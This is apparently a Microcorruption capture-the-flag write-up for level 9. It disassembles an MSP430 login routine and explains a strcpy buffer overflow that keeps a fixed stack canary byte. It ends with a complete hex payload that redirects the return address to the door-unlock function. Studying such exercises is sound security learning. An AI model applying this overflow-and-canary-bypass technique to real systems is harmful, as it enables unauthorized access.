# Introduction
This is the **9th** level in the Microcorruption series.
It's almost exactly the same as the last level, just with a trivial canary making it a bit more difficult.
# Vulnerability Title
Buffer overflow to override the return address, while keeping the canary.
# Walkthrough
The `main` function just calls the `login` function:
```asm
4438 <main>
4438:  b012 2c45      call	#0x452c <login>
```
The `login` function is the following:
```asm
452c <login>
452c:  3150 eeff      add	#0xffee, sp
4530:  f140 9400 1100 mov.b	#0x94, 0x11(sp)
4536:  3f40 7c44      mov	#0x447c "Enter the password to continue.", r15
453a:  b012 f845      call	#0x45f8 <puts>
453e:  3f40 9c44      mov	#0x449c "Remember: passwords are between 8 and 16 characters.", r15
4542:  b012 f845      call	#0x45f8 <puts>
4546:  3e40 3f00      mov	#0x3f, r14
454a:  3f40 0024      mov	#0x2400, r15
454e:  b012 e845      call	#0x45e8 <getsn>
4552:  3e40 0024      mov	#0x2400, r14
4556:  0f41           mov	sp, r15
4558:  b012 2446      call	#0x4624 <strcpy>
455c:  0f41           mov	sp, r15
455e:  b012 5244      call	#0x4452 <test_password_valid>
4562:  0f93           tst	r15
4564:  0524           jz	$+0xc <login+0x44>
4566:  b012 4644      call	#0x4446 <unlock_door>
456a:  3f40 d144      mov	#0x44d1 "Access granted.", r15
456e:  023c           jmp	$+0x6 <login+0x48>
4570:  3f40 e144      mov	#0x44e1 "That password is not correct.", r15
4574:  b012 f845      call	#0x45f8 <puts>
4578:  f190 9400 1100 cmp.b	#0x94, 0x11(sp)
457e:  0624           jz	$+0xe <login+0x60>
4580:  3f40 ff44      mov	#0x44ff "Invalid Password Length: password too long.", r15
4584:  b012 f845      call	#0x45f8 <puts>
4588:  3040 3c44      br	#0x443c <__stop_progExec__>
458c:  3150 1200      add	#0x12, sp
4590:  3041           ret
```
First, it sets up the canary on the stack to be `0x94`:
```asm
4530:  f140 9400 1100 mov.b	#0x94, 0x11(sp)
```
Second, it prompts the user for a password:
```asm
4536:  3f40 7c44      mov	#0x447c "Enter the password to continue.", r15
453a:  b012 f845      call	#0x45f8 <puts>
453e:  3f40 9c44      mov	#0x449c "Remember: passwords are between 8 and 16 characters.", r15
4542:  b012 f845      call	#0x45f8 <puts>
```
Third, it reads the password from the user into address `0x2400` (at most `0x3f` bytes):
```asm
4546:  3e40 3f00      mov	#0x3f, r14
454a:  3f40 0024      mov	#0x2400, r15
454e:  b012 e845      call	#0x45e8 <getsn>
```
Fourth, it copies the password from address `0x2400` onto the stack, using `strcpy`:
```asm
4552:  3e40 0024      mov	#0x2400, r14
4556:  0f41           mov	sp, r15
4558:  b012 2446      call	#0x4624 <strcpy>
```
Fifth, it tests if the password is correct or not:
```asm
455c:  0f41           mov	sp, r15
455e:  b012 5244      call	#0x4452 <test_password_valid>
4562:  0f93           tst	r15
4564:  0524           jz	$+0xc <login+0x44>
```
Sixth, it prints out the decision *and* unlocks the door if the password is correct:
```asm
4566:  b012 4644      call	#0x4446 <unlock_door>
456a:  3f40 d144      mov	#0x44d1 "Access granted.", r15
456e:  023c           jmp	$+0x6 <login+0x48>
4570:  3f40 e144      mov	#0x44e1 "That password is not correct.", r15
4574:  b012 f845      call	#0x45f8 <puts>
```
Seventh, it checks the canary and exits immediately if it's not there:
```asm
4578:  f190 9400 1100 cmp.b	#0x94, 0x11(sp)
457e:  0624           jz	$+0xe <login+0x60>
4580:  3f40 ff44      mov	#0x44ff "Invalid Password Length: password too long.", r15
4584:  b012 f845      call	#0x45f8 <puts>
4588:  3040 3c44      br	#0x443c <__stop_progExec__>
458c:  3150 1200      add	#0x12, sp
4590:  3041           ret
```
# Vulnerability
The vulnerability is in the `login` function.
Essentially, we can overflow the input password, and override the return address.
Regarding the canary, because it's pre-defined with a certain value, we can just include it in the payload, making it seem like we didn't actually overflow anything.
# Exploit
We can craft a payload that will override the return address *and* keep the canary.
The payload could start with 34 `1`'s (17 bytes) to get to the canary, and then we can put the canary, which is `0x94`.
After the canary, we can put a new return address - the easiest one would be to the `unlock_door` function, which is at address `0x4446`.
Putting it all together, we get:
34 x `1` + `canary` + `return address`
Substituting the canary and the return address (flipping it because of little endian), we get:
`1111111111111111111111111111111111944644`
# Solution
Hex: `1111111111111111111111111111111111944644`